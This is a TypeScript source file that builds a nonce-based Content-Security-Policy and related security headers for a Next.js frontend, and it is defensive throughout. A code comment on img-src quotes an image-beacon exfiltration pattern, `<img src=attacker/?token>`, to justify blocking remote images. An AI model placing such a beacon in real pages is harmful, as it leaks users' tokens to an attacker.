/**
 * Content-Security-Policy + companion security headers, built per-request so the
 * script nonce is unique each render.
 *
 * Why this lives in the Next app (middleware) and NOT nginx: the nonce must match
 * the inline bootstrap/flight scripts Next's App Router emits for each render.
 * nginx never sees that nonce, so a CSP set there would have to fall back to
 * `script-src 'unsafe-inline'` — defeating the point. Next, by contrast, reads the
 * nonce from the request CSP header and stamps it onto its own inline scripts.
 *
 * `connect-src` is derived from NEXT_PUBLIC_API_URL: prod builds it EMPTY (frontend
 * + API are same-origin behind nginx, so requests are relative `/api`) → `'self'`
 * suffices; dev sets it to the cross-origin backend (http://localhost:8000), which
 * must be whitelisted or every REST/SSE call is blocked.
 */

export interface CspOptions {
  /** Per-request random nonce (base64). */
  nonce: string;
  /** Relaxes the policy for the dev server (HMR eval + websocket). */
  isDev: boolean;
  /**
   * Resolved backend origin (apiBase.API_URL). "" → same-origin (prod), so
   * connect-src stays 'self'; a concrete origin gets whitelisted.
   */
  apiUrl?: string;
}

/** Extract the bare origin from an API URL; null if unset or unparseable. */
function apiOrigin(apiUrl?: string): string | null {
  if (!apiUrl) return null;
  try {
    return new URL(apiUrl).origin;
  } catch {
    return null;
  }
}

export function buildContentSecurityPolicy({ nonce, isDev, apiUrl }: CspOptions): string {
  const origin = apiOrigin(apiUrl);

  // 'strict-dynamic' lets the nonce'd Next bootstrap load its own /_next/static
  // chunks without each being individually whitelisted; CSP3 browsers then ignore
  // 'self'/'unsafe-inline' here, but 'self' stays as the CSP2 fallback. dev needs
  // 'unsafe-eval' for the Next/webpack HMR runtime.
  const scriptSrc = [
    "'self'",
    `'nonce-${nonce}'`,
    "'strict-dynamic'",
    ...(isDev ? ["'unsafe-eval'"] : []),
  ];

  // REST + SSE both go through fetch(). Same-origin in prod; cross-origin backend
  // + HMR websocket in dev.
  const connectSrc = [
    "'self'",
    ...(origin ? [origin] : []),
    ...(isDev ? ['ws:', 'wss:'] : []),
  ];

  const directives: Record<string, string[]> = {
    'default-src': ["'self'"],
    'script-src': scriptSrc,
    // React style={} props and mermaid's injected inline <style> render as style
    // ATTRIBUTES / inline <style> elements that cannot be nonce'd, so styles need
    // 'unsafe-inline'. Styles are passive (no script execution) — accepted.
    'style-src': ["'self'", "'unsafe-inline'"],
    // 'self' (favicons, artifact://-rewritten links) + data:/blob: (mermaid SVG
    // export, generated previews). Deliberately NO `https:` — an open img-src
    // reopens the `<img src=attacker/?token>` beacon exfil channel that this CSP
    // exists to close (the FE-01 compensation). Cost: remote markdown images won't
    // render; acceptable (intranet is offline; LLM content rarely needs them).
    'img-src': ["'self'", 'data:', 'blob:'],
    'font-src': ["'self'"], // fonts are self-hosted under /public/fonts
    'connect-src': connectSrc,
    'frame-src': ["'none'"],
    'frame-ancestors': ["'none'"],
    'object-src': ["'none'"],
    'base-uri': ["'none'"],
    'form-action': ["'self'"],
  };

  return Object.entries(directives)
    .map(([name, values]) => `${name} ${values.join(' ')}`)
    .join('; ');
}

/** Static, nonce-independent hardening headers (set alongside the CSP). */
export function buildSecurityHeaders(): Record<string, string> {
  return {
    'X-Frame-Options': 'DENY',
    'X-Content-Type-Options': 'nosniff',
    'Referrer-Policy': 'strict-origin-when-cross-origin',
    'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
  };
}
